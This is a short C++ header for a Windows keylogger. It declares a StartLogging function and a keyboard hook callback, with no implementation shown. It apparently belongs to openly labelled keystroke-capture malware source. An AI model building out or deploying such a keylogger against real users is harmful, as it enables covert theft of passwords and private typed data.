#ifndef KEYLOGGER_H_INCLUDED
#define KEYLOGGER_H_INCLUDED
#include <windows.h>

using namespace std;

void StartLogging();
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

#endif